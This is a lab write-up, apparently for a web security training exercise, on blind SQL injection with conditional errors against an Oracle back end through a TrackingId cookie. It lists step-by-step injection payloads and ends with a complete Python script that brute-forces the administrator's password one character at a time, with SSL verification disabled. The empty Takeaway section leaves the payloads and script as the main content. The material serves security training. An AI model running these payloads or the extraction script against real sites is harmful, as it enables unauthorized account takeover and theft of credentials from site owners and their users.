* Title: Blind SQL injection with conditional errors

* Goal: Log in as the administrator user.

* Vulnerability Location: The TrackingId section in the Cookie
 (For this lab I'm gonna use Burp Suite. Intercept the network and send it to repeater to follow this write-up)

* Payload Used:

  ``` ' || (SELECT '' FROM dual)||' ``` ,

  ``` ' ||(SELECT '' FROM users WHERE ROWNUM=1)-- ``` , 

  ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')-- ``` ,

  ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)-- ``` ,

  ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password, 1, 1) = 's')-- ```

* Steps:

  1. Check if the input is injectable. Inject: ``` ' || (SELECT '' FROM dual)||' ```
       If we get 200 status code, the input is being processed by SQL. That means we can move forward.
       It's an Oracle database. Oracle requires a FROM clause in SELECT statements. And "dual" is a built-in table you can use if you don't know
       any tables in the database.

  2. Check if the users table exists. Inject: ``` ' ||(SELECT '' FROM users WHERE ROWNUM=1)-- ```  
       If the page still has the  status code 200, the users table exists and is accessible.
       The "WHERE ROWNUM=1" make sure that the table is returning only the first row. Otherwise it'll return
       muliple rows and it'll break our concatenation.

  3. Check if the administrator user exists. Inject: ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')-- ```
       Now what this payload does is, if the username 'administrator' is in users table, it'll return 500 internal server error.
       That is because it returns Zero Division Error since 1 is equal to 1. If there is no username called 'administrator',
       it returns 200-status code because it wouldn't bother to check the condition.

  4. Find the password length. Inject: ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)-- ```  
       Try different values for LENGTH(password) until the page  has the 500 status code. That tells you the exact length of the password.

       **FYI: every password I encounter in this module has a password that is 20 characters long and it only include lowercase alphanumeric characters.**

  5. Extract the password one character at a time Inject: ``` ' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password, 1, 1) < 'm')-- ```
       This checks if the first character is alphabetically less than 'm'. 

       Use binary search or loop through characters to find the correct one. Then move to the next character: ```SUBSTR(password, 2, 1)```, and try ```SUBSTR(password, 3, 1)```... 

       Repeat until you get the full password, which I personally think is painful and boring. And that's why we're are gonna automate this using a python script.

* Python Script

  ```
             # Import necessary modules for URL encoding, HTTP requests, and system I/O
              import urllib
              import urllib3
              import requests
              import sys
              
              # Suppress SSL certificate warnings (useful for testing against self-signed certs)
              urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
              
              def password_injector(url, base_tracking_id, session_id):
                  # Initialize an empty string to store the extracted password
                  password_extracted = ""
              
                  # Define the character set to brute-force each character of the password
                  charset = "0123456789abcdefghijklmnopqrstuvwxyz"
              
                  # Loop through each character position in the password (assuming max length = 20)
                  for i in range(1, 21):
                      # Loop through each character in the charset to test against the current position
                      for ch in charset:
                          # Construct an error-based SQL injection payload targeting Oracle
                          # If the character at position i matches `ch`, trigger TO_CHAR(1/0) to cause a 500 error
                          sql_payload = (
                              f"' ||(SELECT CASE WHEN(1=1) THEN TO_CHAR(1/0) ELSE '' END "
                              f"FROM users WHERE username='administrator' AND SUBSTR(password, {i}, 1) = '{ch}')-- "
                          )
              
                          # URL-encode the payload to safely inject it into the TrackingId cookie
                          sql_payload_encoded = urllib.parse.quote(sql_payload)
              
                          # Construct the cookies with the injected TrackingId and valid session ID
                          cookies = {
                              "TrackingId": base_tracking_id + sql_payload_encoded,
                              "session": session_id
                          }
              
                          # Send the HTTP GET request with the malicious cookie
                          response = requests.get(url, cookies=cookies, verify=False)
              
                          # If the server returns a 500 error, the injected condition was true
                          if response.status_code == 500:
                              # Append the correct character to the extracted password
                              password_extracted += ch
              
                              # Print the current progress (overwrite line)
                              sys.stdout.write('\r' + password_extracted)
                              sys.stdout.flush()
              
                              # Break out of the inner loop and move to the next character position
                              break
                          else:
                              # If no error, show the character being tested (for visual feedback)
                              sys.stdout.write('\r' + password_extracted + ch)
                              sys.stdout.flush()
              
                  # Final output after full password extraction
                  print(f"\n[+] Extracted Password: {password_extracted}")
              
              def main():
                  # Validate command-line arguments: script requires 3 inputs
                  if len(sys.argv) != 4:
                      print(f"[+] Usage: {sys.argv[0]} <url> TrackingId SessionId")
                      print(f"[+] Example: {sys.argv[0]} www.example.com nRoouTRuuq9Ate8w lwz0qgqnBKdlhlFOXFRxGVA9RHSxdIss")
                      sys.exit(-1)
              
                  # Parse command-line arguments
                  url = sys.argv[1]
                  tracking_id = sys.argv[2]
                  session_id = sys.argv[3]
              
                  # Start the extraction process
                  print("[+] Retrieving password...")
                  password_injector(url, tracking_id, session_id)
              
              # Entry point for the script
              if __name__ == "__main__":
                  main()

  ```


* Takeaway: 
